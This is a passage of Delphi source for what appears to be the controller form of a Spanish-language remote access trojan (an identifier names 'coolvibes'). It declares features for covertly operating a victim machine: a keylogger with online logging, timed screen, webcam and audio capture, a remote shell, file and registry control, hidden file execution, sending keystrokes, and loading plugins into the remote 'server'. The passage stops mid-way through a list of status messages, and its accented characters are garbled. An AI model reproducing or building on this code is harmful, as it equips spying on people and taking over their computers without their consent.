unit UnitFormControl;

interface

uses
  Windows, Shellapi, Messages, SysUtils, Classes, Graphics, Controls, Forms, CommCtrl,
  Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
  Spin,
  IdTCPServer, ActiveX, gnugettext, MMsystem, UnitPlugins;

type
  TSearchItem = record
    Nombre: string;
    Tamanio: string;
    Tipo: string;
    Atributos: string;
    Fechamodify: Integer;
    TamanioReal: Integer;
    SortData: string;
  end;

type
  TCachedIcon = record
    Extension: string;
    num: Integer;
  end;

type
  TFormControl = class(TForm)
    PageControl: TPageControl;
    TabInfo: TTabSheet;
    TabManagers: TTabSheet;
    TabExtra: TTabSheet;
    TabFileManager: TTabSheet;
    DlgGuardar: TSaveDialog;
    PopupProcess: TPopupMenu;
    Cerrar1: TMenuItem;
    PopupWindows: TPopupMenu;
    Cerrar2: TMenuItem;
    Maximizar1: TMenuItem;
    Minimizar1: TMenuItem;
    Mostrar1: TMenuItem;
    Ocultar1: TMenuItem;
    Minimizartodas1: TMenuItem;
    BotnCerrarX1: TMenuItem;
    Activar1: TMenuItem;
    Desactivar1: TMenuItem;
    PopupFileManager: TPopupMenu;
    EjecutarAbrir1: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Eliminar: TMenuItem;
    Cambiarnombre1: TMenuItem;
    Crearnuevacarpeta1: TMenuItem;
    PopupRegistro: TPopupMenu;
    Nuevo1: TMenuItem;
    Clave1: TMenuItem;
    N2: TMenuItem;
    Valoralfanumrico1: TMenuItem;
    Valorbinerio1: TMenuItem;
    valorDWORD1: TMenuItem;
    Valordecadenamltiple1: TMenuItem;
    N3: TMenuItem;
    N1: TMenuItem;
    Eliminar1: TMenuItem;
    XPManifest: TXPManifest;
    StatusBar: TStatusBar;
    Enviarteclas1: TMenuItem;
    TimerCaptureScreen: TTimer;
    Descargarfichero1: TMenuItem;
    N4: TMenuItem;
    PopupDescargas: TPopupMenu;
    Subir1: TMenuItem;
    Bajar1: TMenuItem;
    Subiralprimerpuesto1: TMenuItem;
    ltimopuesto1: TMenuItem;
    Borrarcompletados1: TMenuItem;
    Eliminardescarga1: TMenuItem;
    Subirfichero1: TMenuItem;
    OpenDialogUpload: TOpenDialog;
    PopupShell: TPopupMenu;
    Activar2: TMenuItem;
    DlgFont: TFontDialog;
    DlgColors: TColorDialog;
    Desactivar2: TMenuItem;
    N5: TMenuItem;
    Guardarcmo1: TMenuItem;
    PopupServicios: TPopupMenu;
    Iniciar1: TMenuItem;
    DEtener1: TMenuItem;
    Desinstalar1: TMenuItem;
    Instalar1: TMenuItem;
    DetenerDescarga1: TMenuItem;
    ReanudarDescarga1: TMenuItem;
    Agregaracoladedescarga1: TMenuItem;
    N6: TMenuItem;
    N7: TMenuItem;
    Iralproceso1: TMenuItem;
    Previsualizarjpg1: TMenuItem;
    TimerCamCapture: TTimer;
    PopupGuardarPantallaoWebcam: TPopupMenu;
    Guardarimagen1: TMenuItem;
    Guardadoautomtico1: TMenuItem;
    IconsArchivos: TImageList;
    N9: TMenuItem;
    Abrircarpetadescargas1: TMenuItem;
    PrevisualizarImagenes1: TMenuItem;
    Portapapeles1: TMenuItem;
    Copiar1: TMenuItem;
    Pegar1: TMenuItem;
    N8: TMenuItem;
    BuscarArchivos1: TMenuItem;
    CambiarAtributos1: TMenuItem;
    Oculto2: TMenuItem;
    Sistema1: TMenuItem;
    Slolectura1: TMenuItem;
    PopupRutasRapidas: TPopupMenu;
    Windir1: TMenuItem;
    Directoriodesistema1: TMenuItem;
    Misdocumentos1: TMenuItem;
    Escritorio1: TMenuItem;
    ArchivosRecientes1: TMenuItem;
    Directoriodeinstalaciondecoolvibes1: TMenuItem;
    PageControlInformacion: TPageControl;
    TabSheetServidor: TTabSheet;
    TabSheetInfoSistema: TTabSheet;
    ListViewInformacion: TListView;
    ListViewServidor: TListView;
    ComboBoxGestionDeServidor: TComboBox;
    BtnEnviarComandoServidor: TSpeedButton;
    BtnActualizarServidorInfo: TSpeedButton;
    BtnRefrescarInformacion: TSpeedButton;
    PageControlArchivos: TPageControl;
    TabSheetVerArchivos: TTabSheet;
    BtnVerUnidades: TSpeedButton;
    LabelPathArchivos: TLabel;
    BtnActualizarArchivos: TSpeedButton;
    LabelNumeroDeCarpetas: TLabel;
    LabelNumeroDeArchivos: TLabel;
    SpeedButtonRutasRapidas: TSpeedButton;
    cmbUnidades: TComboBox;
    EditPathArchivos: TEdit;
    ListViewArchivos: TListView;
    TabSheetTransferencias: TTabSheet;
    LabelTransferencias: TLabel;
    ListViewDescargas: TListView;
    PageControlExtra: TPageControl;
    TabSheetMensajes: TTabSheet;
    TabSheetBromas: TTabSheet;
    ListViewBromas: TListView;
    BtnEnviarBromas: TSpeedButton;
    LabelTituloMensaje: TLabel;
    EditTituloMensaje: TEdit;
    MemoMensaje: TMemo;
    GrpBoxTipoMensaje: TGroupBox;
    ImgError: TImage;
    ImgAsterisk: TImage;
    ImgWarning: TImage;
    ImgInfo: TImage;
    RdBtnError: TRadioButton;
    RdBtnPregunta: TRadioButton;
    RdBtnExclamacion: TRadioButton;
    RdBtnInfo: TRadioButton;
    RdBtnVacio: TRadioButton;
    RdGrpBotonesMensaje: TRadioGroup;
    BtnEnviarMensaje: TSpeedButton;
    N10: TMenuItem;
    Refrescar1: TMenuItem;
    AbrirCarpetaDescargas2: TMenuItem;
    TabSheetBuscar: TTabSheet;
    ListViewBuscar: TListView;
    EditBuscar: TEdit;
    SpeedButtonBuscar: TSpeedButton;
    LabelNumeroEncontrados: TLabel;
    Abrirdirectorio1: TMenuItem;
    PageControlManagers: TPageControl;
    TabProcesos: TTabSheet;
    ListViewProcesos: TListView;
    BtnRefrescarProcesos: TSpeedButton;
    TabVentanas: TTabSheet;
    ListViewVentanas: TListView;
    CheckBoxMostrarVentanasOcultas: TCheckBox;
    BtnRefrescarVentanas: TSpeedButton;
    TabRegistro: TTabSheet;
    PanelRegistro: TPanel;
    SplitterRegistro: TSplitter;
    TreeViewRegedit: TTreeView;
    ListViewRegistro: TListView;
    EditPathRegistro: TEdit;
    BtnVerRegisto: TSpeedButton;
    TabServicios: TTabSheet;
    ListViewServicios: TListView;
    MultiEditInstalarServicio: TEdit;
    btnInstServicios2: TSpeedButton;
    BtnCancelarInstalarServicio: TSpeedButton;
    BtnServicios: TSpeedButton;
    btnInstServicios: TSpeedButton;
    btnSiguienteInstalarServicio: TSpeedButton;
    TabPortapapeles: TTabSheet;
    MemoClipBoard: TMemo;
    SpeedButtonClipBoard1: TSpeedButton;
    SpeedButtonClipBoard2: TSpeedButton;
    TabShell: TTabSheet;
    MemoShell: TMemo;
    ComboBoxShellCommand: TComboBox;
    BtnCambiarFuenteShell: TSpeedButton;
    BtnCambiarColorShell: TSpeedButton;
    TabVigilancia: TTabSheet;
    PageControlVigilancia: TPageControl;
    TabScreencap: TTabSheet;
    TabWebcam: TTabSheet;
    TabKeylogger: TTabSheet;
    ScrollBoxCapScreenM: TScrollBox;
    imgCaptura: TImage;
    ProgressBarScreen: TProgressBar;
    LabelTamano: TLabel;
    LabelCalidadCapScreen: TLabel;
    TrackBarCalidad: TTrackBar;
    BtnCapturarScreen: TSpeedButton;
    CheckBoxAutoCapturaScreen: TCheckBox;
    SpinCaptureScreen: TSpinEdit;
    btnGuardarImagen: TSpeedButton;
    BtnVerGrandeCap: TSpeedButton;
    LabelPosicionCompresJpg: TLabel;
    CheckBoxMouseClicks: TCheckBox;
    CheckBoxTamanioReal: TCheckBox;
    ScrollBoxCapWebcam: TScrollBox;
    ImgWebcam: TImage;
    ProgressBarWebcam: TProgressBar;
    ComboBoxWebcam: TComboBox;
    LabelCalidadWebcam: TLabel;
    CheckBoxAutoCamCapture: TCheckBox;
    SpinCam: TSpinEdit;
    BtnCapturarWebcam: TSpeedButton;
    TrackBarCalidadWebcam: TTrackBar;
    BtnGuardarWebcam: TSpeedButton;
    BtnObtenerWebcams: TSpeedButton;
    LabelPosicionCompresJpgWebcam: TLabel;
    RichEditKeylogger: TRichEdit;
    EditLogName: TEdit;
    ProgressBarKeylogger: TProgressBar;
    SpeedButtonRecibirLog: TSpeedButton;
    SpeedButtonEliminarLog: TSpeedButton;
    SpeedButtonGuardarLog: TSpeedButton;
    CheckBoxOnlineKeylogger: TCheckBox;
    SpeedButtonActivarKeylogger: TSpeedButton;
    TabAudio: TTabSheet;
    PanelAudio: TPanel;
    GroupBoxAudio: TGroupBox;
    ListViewAudioFormato: TListView;
    SplitterAudio: TSplitter;
    ListViewAudio: TListView;
    LabelTamanioAudio: TLabel;
    SpinEditAudio: TSpinEdit;
    Label2: TLabel;
    SpeedButtonCapAudio: TSpeedButton;
    CheckBoxCapturarAudioAutomaticamente: TCheckBox;
    CheckBoxAutoReproducir: TCheckBox;
    ComboBoxAudioDevices: TComboBox;
    SpeedButtonListarAudio: TSpeedButton;
    PopupAudio: TPopupMenu;
    Eliminar2: TMenuItem;
    Reproducir1: TMenuItem;
    Guardar1: TMenuItem;
    ProgressBarAudio: TProgressBar;
    Labellengthaudio: TLabel;
    SpeedButton1: TSpeedButton;
    TimerCuentaEncontrados: TTimer;
    LabelTamaniowebcam: TLabel;
    SpeedButton2: TSpeedButton;
    TabPuertos: TTabSheet;
    ListViewPuertos: TListView;
    BtnRefrescarPuertos: TSpeedButton;
    CheckBoxPuertos: TCheckBox;
    PopupMenuPuertos: TPopupMenu;
    CerrarConexin1: TMenuItem;
    MatarProceso1: TMenuItem;
    Iraproceso1: TMenuItem;
    N11: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure BtnRefrescarProcesosClick(Sender: TObject);
    procedure BtnRefrescarVentanasClick(Sender: TObject);
    procedure cmbUnidadesSelect(Sender: TObject);
    procedure ListViewArchivosDblClick(Sender: TObject);
    procedure Cerrar1Click(Sender: TObject);
    procedure Cerrar2Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Minimizartodas1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure EliminarClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Crearnuevacarpeta1Click(Sender: TObject);
    procedure BtnRefrescarInformacionClick(Sender: TObject);
    procedure BtnActualizarArchivosClick(Sender: TObject);
    procedure BtnEnviarBromasClick(Sender: TObject);
    procedure BtnVerUnidadesClick(Sender: TObject);
    procedure TreeViewRegeditDblClick(Sender: TObject);
    procedure TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
    procedure BtnVerRegistoClick(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure ListViewRegistroEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Eliminar1Click(Sender: TObject);
    procedure Valoralfanumrico1Click(Sender: TObject);
    procedure TreeViewRegeditContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure ListViewRegistroContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure Clave1Click(Sender: TObject);
    procedure ListViewArchivosContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure ListViewArchivosEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Valorbinerio1Click(Sender: TObject);
    procedure valorDWORD1Click(Sender: TObject);
    procedure Valordecadenamltiple1Click(Sender: TObject);
    procedure BtnEnviarMensajeClick(Sender: TObject);
    procedure Activar1Click(Sender: TObject);
    procedure Desactivar1Click(Sender: TObject);
    procedure TrackBarCalidadChange(Sender: TObject);
    procedure BtnCapturarScreen1Click(Sender: TObject);
    procedure Enviarteclas1Click(Sender: TObject);
    procedure TrackBarCalidadWebcamChange(Sender: TObject);
    procedure BtnObtenerWebcamsClick(Sender: TObject);
    procedure BtnCapturarWebcamClick(Sender: TObject);
    procedure EnviarClickM(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure BtnActualizarServidorInfoClick(Sender: TObject);
    procedure BtnEnviarComandoServidorClick(Sender: TObject);
    procedure BtnVerGrandeCapClick(Sender: TObject);
    procedure TimerCaptureScreenTimer(Sender: TObject);
    procedure Descargarfichero1Click(Sender: TObject);
    procedure Borrarcompletados1Click(Sender: TObject);
    procedure ListViewDescargasContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Eliminardescarga1Click(Sender: TObject);
    procedure Subiralprimerpuesto1Click(Sender: TObject);
    procedure Subir1Click(Sender: TObject);
    procedure Bajar1Click(Sender: TObject);
    procedure ltimopuesto1Click(Sender: TObject);
    procedure Subirfichero1Click(Sender: TObject);
    procedure Activar2Click(Sender: TObject);
    procedure ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
    procedure BtnCambiarFuenteShellClick(Sender: TObject);
    procedure BtnCambiarColorShellClick(Sender: TObject);
    procedure PopupShellPopup(Sender: TObject);
    procedure Desactivar2Click(Sender: TObject);
    procedure Guardarcmo1Click(Sender: TObject);
    procedure BtnServiciosClick(Sender: TObject);
    procedure DEtener1Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Instalar1Click(Sender: TObject);
    procedure BtnCancelarInstalarServicioClick(Sender: TObject);
    procedure btnSiguienteInstalarServicioClick(Sender: TObject);
    procedure btnInstServiciosClick(Sender: TObject);
    procedure btnInstServicios2Click(Sender: TObject);
    procedure PopupDescargasPopup(Sender: TObject);
    procedure DetenerDescarga1Click(Sender: TObject);
    procedure ReanudarDescarga1Click(Sender: TObject);
    procedure Agregaracoladedescarga1Click(Sender: TObject);
    procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
    procedure ListViewProcesosCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure ListViewRegistroCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn); //Desde FormBuscar
    procedure ListViewArchivosCompare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer); //Desde formbuscar

    procedure Iralproceso1Click(Sender: TObject);
    procedure SpinCaptureScreenChange(Sender: TObject);
    procedure CheckBoxAutoCapturaScreenClick(Sender: TObject);
    procedure Previsualizarjpg1Click(Sender: TObject);
    procedure SpinCamChange(Sender: TObject);
    procedure CheckBoxAutoCamCaptureClick(Sender: TObject);
    procedure TimerCamCaptureTimer(Sender: TObject);
    procedure CheckBoxMostrarVentanasOcultasClick(Sender: TObject);
    procedure Guardarimagen1Click(Sender: TObject);
    procedure btnGuardarImagenClick(Sender: TObject);
    procedure PopupGuardarPantallaoWebcamPopup(Sender: TObject);
    procedure Guardadoautomtico1Click(Sender: TObject);
    procedure TabKeyloggerShow(Sender: TObject);
    procedure SpeedButtonRecibirLogClick(Sender: TObject);
    procedure SpeedButtonActivarKeyloggerClick(Sender: TObject);
    procedure SpeedButtonEliminarLogClick(Sender: TObject);
    procedure CheckBoxOnlineKeyloggerClick(Sender: TObject);
    procedure SpeedButtonGuardarLogClick(Sender: TObject);
    procedure TabServidorShow(Sender: TObject);
    procedure TabVentanasShow(Sender: TObject);
    procedure TabServiciosShow(Sender: TObject);
    procedure TabScreencapShow(Sender: TObject);
    procedure TabWebcamShow(Sender: TObject);
    procedure CheckBoxTamanioRealClick(Sender: TObject);
    procedure PrevisualizarImagenes1Click(Sender: TObject);
    procedure Copiar1Click(Sender: TObject);
    procedure Pegar1Click(Sender: TObject);
    procedure Abrircarpetadescargas1Click(Sender: TObject);
    procedure BuscarArchivos1Click(Sender: TObject);
    procedure ListViewArchivosCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Oculto2Click(Sender: TObject);
    procedure Sistema1Click(Sender: TObject);
    procedure Slolectura1Click(Sender: TObject);
    procedure SpeedButtonRutasRapidasClick(Sender: TObject);
    procedure Windir1Click(Sender: TObject);
    procedure Directoriodesistema1Click(Sender: TObject);
    procedure Misdocumentos1Click(Sender: TObject);
    procedure Escritorio1Click(Sender: TObject);
    procedure ArchivosRecientes1Click(Sender: TObject);
    procedure Directoriodeinstalaciondecoolvibes1Click(Sender: TObject);
    procedure ComboBoxWebcamKeyPress(Sender: TObject; var Key: Char);
    procedure ListViewVentanasCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure TabSheetTransferenciasShow(Sender: TObject);
    procedure TabSheetServidorShow(Sender: TObject);
    procedure TabSheetInfoSistemaShow(Sender: TObject);
    procedure TabSheetVerArchivosShow(Sender: TObject);
    procedure Refrescar1Click(Sender: TObject);
    procedure SpeedButtonBuscarClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ListViewBuscarContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure Abrirdirectorio1Click(Sender: TObject);
    procedure FormShortCut(var Msg: TWMKey; var Handled: Boolean);
    procedure TabSheetBuscarShow(Sender: TObject);
    procedure SpeedButtonClipBoard1Click(Sender: TObject);
    procedure SpeedButtonClipBoard2Click(Sender: TObject);
    procedure TabProcesosShow(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure SpeedButtonCapAudioClick(Sender: TObject);
    procedure SpeedButtonListarAudioClick(Sender: TObject);
    procedure CheckBoxCapturarAudioAutomaticamenteClick(Sender: TObject);
    procedure PopupAudioPopup(Sender: TObject);
    procedure TabAudioShow(Sender: TObject);
    procedure SpinEditAudioChange(Sender: TObject);
    procedure Eliminar2Click(Sender: TObject);
    procedure Guardar1Click(Sender: TObject);
    procedure Reproducir1Click(Sender: TObject);
    procedure ListViewAudioFormatoClick(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure ListViewBuscarData(Sender: TObject; Item: TListItem);
    procedure TimerCuentaEncontradosTimer(Sender: TObject);
    procedure LabelVelocidadClick(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure ListViewBuscarColumnClick(Sender: TObject;
      Column: TListColumn);
    procedure FormShow(Sender: TObject);
    procedure BtnRefrescarPuertosClick(Sender: TObject);
    procedure ListViewPuertosCompare(Sender: TObject; Item1,
      Item2: TListItem; Data: Integer; var Compare: Integer);
    procedure CerrarConexin1Click(Sender: TObject);
    procedure MatarProceso1Click(Sender: TObject);
    procedure TabPuertosShow(Sender: TObject);
    procedure cmbUnidadesDrawItem(Control: TWinControl; Index: Integer;
      Rect: TRect; State: TOwnerDrawState);
    procedure ListViewDescargasDblClick(Sender: TObject);

  private //Funciones y variables privadas que solo podemos usar en este Form
    FormVisorDeMiniaturas: TObject;
    mslistviewitem: Tlistitem;
    RecibiendoFichero: Boolean;
    NombreSI, DescripcionSI, RutaSI: string; //EnviarInstalarservicios
    Columna, ColumnaOrdenada: Integer;
    PrefijoGuardarCaptura, PrefijoGuardarWebcam: string; //Para el guardado autom�tico
    InumeroCaptura, InumeroWebcam: Integer;
    PrevisualizacionActiva: Boolean; //activada o desactivada la previsualizaci�n  de imagenes
    PortaPapeles: string;
    ReceivingThumbfile: Boolean;
    IconosGrandes: TImageList;
    NumeroIconos: Integer;
    MSGPosibles: array of string;
    NumeroAudio: Integer;
    UltimoFormato: string; //�ltimo formato de audio utilizado
    ParaDeBuscar: Boolean;
    SearchItems: array[0..50000] of TSearchItem;
    Encontrados: Integer; //Numero de encontrados
    ParaDeListar: Boolean;
    Reversed: Boolean;
    CachedIcons: array[0..1000000] of TCachedIcon;
    numcached: Integer;
    PrimeraVezQueMeMuestro: Boolean;
    CapSize: array[0..5] of Integer; //Tama�o de la captura.. que estamos recibiendo
    MSc: array[0..5] of TMemoryStream; //EL memoryStream donde recibiremos las capturas...
    Keyloggerlog: string; //Para recibir el log del keylogger
    function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
    procedure AniadirClavesARegistro(Claves: string);
    procedure AniadirValoresARegistro(Valores: string);
    procedure AgregarDescargaEnCola(FileName: string; tamano: Integer);
    procedure CargarThumbsFileAlListview(thumbsfilepath: string); //Funcion para mostrar imagenes de un archivo thumbs.db a el listview de archivos
    function FileIconInit(FullInit: BOOL): BOOL; stdcall;
    procedure CargarIconos(primeravez: Boolean);
    function IconNum(strExt: string; usecache: Boolean): Integer;
    procedure AgregarDescarga(FileName: string);
    procedure TransferFinishedNotification(Sender: TObject; FileName: string);
    procedure CreateParams(var Params: TCreateParams); override;
    procedure Estado(Estado: string);
    procedure AgregarARichEdit(Texto: string); //Agrega texto en color a RichEdit
  public //Funciones p�blicas que podemos llamar desde otros Forms
    Plugins: array[0..100] of TPlugin;
    NumeroPlugins : integer; //Numero de plugins cargados
    Servidor: TIdPeerThread;
    RecibiendoJPG: Boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
    AnchuraPantalla, AlturaPantalla: Integer; //Altura y anchura de la pantalla del servidor
    AnchuraWebCam, AlturaWebCam: Integer; //Altura y anchura de la webcam del servidor
    FormVisorCaptura: TObject;
    DirUsuario, DirCapturas, DirWebcam, DirMiniaturas, DirDescargas: string;
    MyItem: TListItem; //Item de listviewconexiones
    constructor Create(aOwner: TComponent; AThread: TIdPeerThread; Item: Tlistitem);
    procedure OnRead(command: string; AThread: TIdPeerThread); overload;
    procedure OnReadFile(AThread: TIdPeerThread); overload;
    procedure CrearDirectoriosUsuario(); //Es llamada tambien desde el visor de Thumbnails
    function InitWavFile(var Ms: TMemoryStream; nChannels, nSamplesPerSec, wBitsPerSample: Word; b: string): Integer;
    procedure CargarPlugin(PluginName:string);
  end;

var
  FormControl: TFormControl;

implementation

uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas, UnitTransfer,
  UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones, AxThumbsDB, Storages;

{$R *.dfm}

procedure TFormControl.CargarPlugin(PluginName:string);
var
  i : integer;
  Path : string;
  H : THandle;
  Plugin : TPlugin;
begin
  for i:= 0 to formopciones.ListViewPlugins.Items.Count-1 do
    if formopciones.ListViewPlugins.Items[i].caption = PluginName then
      Path := formopciones.ListViewPlugins.Items[i].SubItems[1];

  if Path <> '' then
  begin
    H := loadlibrary(pchar(Path));
    Plugins[NumeroPlugins] := TPlugin.Create(H);
    Plugins[NumeroPlugins].path := Path;
    //Mostramos la form del plugin
    Plugins[NumeroPlugins].Conectar(Myitem.Caption, Servidor.Connection.Socket.Binding.Handle, NumeroPlugins);   
    TForm(Plugins[NumeroPlugins].dForm).Visible := false;//La ocultamos hasta que el server la cargue
    Servidor.Connection.WriteLn('LOADPLUGIN|'+Plugins[NumeroPlugins].PluginName+'|'+inttostr(NumeroPlugins)+'|');
    NumeroPlugins := NumeroPlugins+1;
  end;
end;

procedure TFormControl.AgregarARichEdit(Texto: string);
var
  TempStr: string;
begin
  while Pos(#10, Texto) > 0 do
    begin
      TempStr := Copy(Texto, 1, Pos(#10, Texto));
      Delete(Texto, 1, Pos(#10, Texto));

      if (Copy(TempStr, 1, 2) = '-[') then //evento
        begin
          RichEditKeylogger.SelAttributes.Style := [fsBold];
          RichEditKeylogger.SelAttributes.Color := clRed;
        end
      else if (Copy(TempStr, 1, 2) = '-{') then
        begin
          RichEditKeylogger.SelAttributes.Style := [fsBold];
          RichEditKeylogger.SelAttributes.Color := clgreen;
        end
      else
        begin
          RichEditKeylogger.SelAttributes.Style := [];
          RichEditKeylogger.SelAttributes.Color := clBlack;
        end;
      RichEditKeylogger.SelText := TempStr {+ #13+#10};

    end;
  RichEditKeylogger.SelText := Texto;
end;

procedure TFormControl.Estado(Estado: string); //Cambia el texto de la statusbar
begin
  Statusbar.Panels[1].Text := '[' + timetostr(now) + '] ' + Estado;
end;

function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
type
  TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
var

  ShellDLL: HMODULE;
  PFileIconInit: TFileIconInit;
begin
  Result := False;
  if (Win32Platform = VER_PLATFORM_WIN32_NT) then
    begin
      ShellDLL := LoadLibrary(PChar('shell32.dll'));
      PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
      if (Assigned(PFileIconInit)) then
        Result := PFileIconInit(FullInit);
    end;
end;

constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread; Item: Tlistitem);
var
  tempstr, uname, pcname: string;
  i: Integer;
begin
  inherited Create(aOwner);
  Servidor := AThread;
  MyItem := Item;
  FormVisorDeMiniaturas := nil;
  Self.Caption :=
    _('Centro de control:') + ' ' + Item.Caption +
    ' ' + Athread.Connection.Socket.Binding.PeerIP;

  TempStr := item.SubItems[10]; //Extraemos el nombre de usuario y del pc
  UName := Copy(TempStr, 1, Pos('/', TempStr) - 1); //Nombre de usuario
  Delete(TempStr, 1, Pos('/', TempStr));
  PcName := TempStr;

  DirUsuario := Lowercase(FormOpciones.LabeledEditDirUser.Text);
  DirCapturas := Lowercase(FormOpciones.LabeledDirScreen.Text);
  DirWebcam := Lowercase(FormOpciones.LabeledDirWebcam.Text);
  DirMiniaturas := Lowercase(FormOpciones.LabeledDirThumbs.Text);
  DirDescargas := Lowercase(FormOpciones.LabeledDirDownloads.Text);

  for i := 0 to 4 do
    begin
      case i of
        0: TempStr := DirUsuario;
        1: TempStr := DirCapturas;
        2: TempStr := DirWebcam;
        3: TempStr := DirMiniaturas;
        4: TempStr := DirDescargas;
      end;

      TempStr := StringReplace(TempStr, '%cooldir%', extractfiledir(ParamStr(0)), [rfReplaceAll]);
      TempStr := StringReplace(TempStr, '%identificator%', item.Caption, [rfReplaceAll]);
      TempStr := StringReplace(TempStr, '%username%', UName, [rfReplaceAll]);
      TempStr := StringReplace(TempStr, '%pcname%', PcName, [rfReplaceAll]);

      case i of
        0: DirUsuario := IncludeTrailingBackslash(TempStr);
        1: DirCapturas := IncludeTrailingBackslash(TempStr);
        2: DirWebcam := IncludeTrailingBackslash(TempStr);
        3: DirMiniaturas := IncludeTrailingBackslash(TempStr);
        4: DirDescargas := IncludeTrailingBackslash(TempStr);
      end;
    end;
end;

procedure TFormControl.FormCreate(Sender: TObject);
begin
  UseLanguage(Formmain.idioma);
  PrimeraVezQueMeMuestro := True;
  TranslateComponent(Self);
  SetLength(MSGPosibles, 56);
  MSGPosibles[0] := _('De momento no funciona esta funci�n :-)');
  MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualizaci�n se completara en el siguiente reinicio');
  MSGPosibles[2] := _('Proceso matado con PID ');
  MSGPosibles[3] := _(' :( No pude matar el proceso con PID ');
  MSGPosibles[4] := _('Ventana cerrada con Handle ');
  MSGPosibles[5] := _('Ventana maximizada con Handle ');
  MSGPosibles[6] := _('Ventana minimizada con Handle ');
  MSGPosibles[7] := _('Ventana mostrada con Handle ');
  MSGPosibles[8] := _('Ventana ocultada con Handle ');
  MSGPosibles[9] := _('Minimizadas todas las ventanas.');
  MSGPosibles[10] := _('Se activ� el bot�n Cerrar [X] en la ventana con Handle ');
  MSGPosibles[11] := _('Se desactiv� el bot�n Cerrar [X] en la ventana con Handle ');
  MSGPosibles[12] := _('No se pudieron enviar las teclas a la ventana con handle ');
  MSGPosibles[13] := _('Se enviaron las teclas a la ventana con handle ');
  MSGPosibles[14] := _('El usuario respondi�: OK');
  MSGPosibles[15] := _('El usuario respondi�: Cancelar');
  MSGPosibles[16] := _('El usuario respondi�: Reintentar');
  MSGPosibles[17] := _('El usuario respondi�: S�');
  MSGPosibles[18] := _('El usuario respondi�: No');
  MSGPosibles[19] := _('El usuario respondi�: Anular');
  MSGPosibles[20] := _('El usuario respondi�: Omitir');
  MSGPosibles[21] := _('Archivo correctamente ejecutado :).');
  MSGPosibles[22] := _('Se produjo alg�n error al ejecutar el archivo.');
  MSGPosibles[23] := _('Archivo correctamente ejecutado de manera oculta :).');
  MSGPosibles[24] := _('Se produjo alg�n error al ejecutar el archivo de manera oculta.');
  MSGPosibles[25] := _('El archivo fue borrado con �xito.');
  MSGPosibles[26] := _('El archivo no se pudo borrar.');
  MSGPosibles[27] := _('El archivo no existe. Tal vez ya fue borrado.');
  MSGPosibles[28] := _('La carpeta fue borrada con �xito.');
  MSGPosibles[29] := _('No se pudo borrar la carpeta.');
  MSGPosibles[30] := _('La carpeta no existe. Tal vez ya fue borrada.');
  MSGPosibles[31] := _('Archivo o carpeta renombrada con �xito.');
  MSGPosibles[32] := _('No se pudo renombrar el archivo o la carpeta.');
  MSGPosibles[33] := _('El archivo o la carpeta no existe.');
  MSGPosibles[34] := _('Carpeta creada con �xito.');
  MSGPosibles[35] := _('No se pudo crear la carpeta.');
  MSGPosibles[36] := _('La carpeta ya existe); no es necesario crearla.');
  MSGPosibles[37] := _('Archivo copiado con �xito');
  MSGPosibles[38] := _('Error al copiar el archivo');
  MSGPosibles[39] := _('Modificado nombre de clave con �xito.');
  MSGPosibles[40] := _('Error al modificar el nombre de la clave.');
  MSGPosibles[41] := _('Clave o Valor eliminado con �xito.');
  MSGPosibles[42] := _('No se pudo eliminar la clave o el valor.');
  MSGPosibles[43] := _('Clave a�adida con �xito.');
  MSGPosibles[44] := _('No se pudo a�adir la clave.');
  MSGPosibles[45] := _('Valor a�adido con �xito.');
  MSGPosibles[46] := _('No se pudo a�adir el valor.');
  MSGPosibles[47] := _('Se ha intentado iniciar el serivico');
